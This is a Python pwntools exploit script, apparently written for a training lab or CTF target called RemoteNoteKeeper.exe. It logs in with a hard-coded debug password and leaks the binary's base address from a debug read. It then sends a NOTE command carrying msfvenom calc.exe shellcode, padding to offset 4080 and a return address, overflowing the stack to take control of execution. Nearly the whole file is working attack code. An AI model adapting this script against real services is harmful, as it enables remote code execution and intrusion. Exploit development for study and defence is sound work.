#!/usr/bin/python3
from pwn import remote, p32

shell = remote("Windows", 1337)
shell.sendlineafter(b"> ", b"DEBUG exp301isfun")
shell.sendlineafter(b"> ", b"READ DEBUG")

binary_base = int(shell.recvline_contains(b"RemoteNoteKeeper.exe")[-11:-1], 16)

prefix = b"NOTE "

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d'
shellcode =  b""
shellcode += b"\xbf\x5e\x28\xf4\xe3\xdd\xc6\xd9\x74\x24\xf4"
shellcode += b"\x5a\x2b\xc9\xb1\x31\x83\xc2\x04\x31\x7a\x0f"
shellcode += b"\x03\x7a\x51\xca\x01\x1f\x85\x88\xea\xe0\x55"
shellcode += b"\xed\x63\x05\x64\x2d\x17\x4d\xd6\x9d\x53\x03"
shellcode += b"\xda\x56\x31\xb0\x69\x1a\x9e\xb7\xda\x91\xf8"
shellcode += b"\xf6\xdb\x8a\x39\x98\x5f\xd1\x6d\x7a\x5e\x1a"
shellcode += b"\x60\x7b\xa7\x47\x89\x29\x70\x03\x3c\xde\xf5"
shellcode += b"\x59\xfd\x55\x45\x4f\x85\x8a\x1d\x6e\xa4\x1c"
shellcode += b"\x16\x29\x66\x9e\xfb\x41\x2f\xb8\x18\x6f\xf9"
shellcode += b"\x33\xea\x1b\xf8\x95\x23\xe3\x57\xd8\x8c\x16"
shellcode += b"\xa9\x1c\x2a\xc9\xdc\x54\x49\x74\xe7\xa2\x30"
shellcode += b"\xa2\x62\x31\x92\x21\xd4\x9d\x23\xe5\x83\x56"
shellcode += b"\x2f\x42\xc7\x31\x33\x55\x04\x4a\x4f\xde\xab"
shellcode += b"\x9d\xc6\xa4\x8f\x39\x83\x7f\xb1\x18\x69\xd1"
shellcode += b"\xce\x7b\xd2\x8e\x6a\xf7\xfe\xdb\x06\x5a\x94"
shellcode += b"\x1a\x94\xe0\xda\x1d\xa6\xea\x4a\x76\x97\x61"
shellcode += b"\x05\x01\x28\xa0\x62\xed\xca\x61\x9e\x86\x52"
shellcode += b"\xe0\x23\xcb\x64\xde\x67\xf2\xe6\xeb\x17\x01"
shellcode += b"\xf6\x99\x12\x4d\xb0\x72\x6e\xde\x55\x75\xdd"
shellcode += b"\xdf\x7f\x16\x80\x73\xe3\xf7\x27\xf4\x86\x07"

# !py mona pattern_offset eip
offset = 4080
junk = b"A" * (offset - len(shellcode))

ret = p32(binary_base + 0x1009) # ret;

payload = prefix + shellcode + junk + ret

shell.sendlineafter(b"> ", payload)
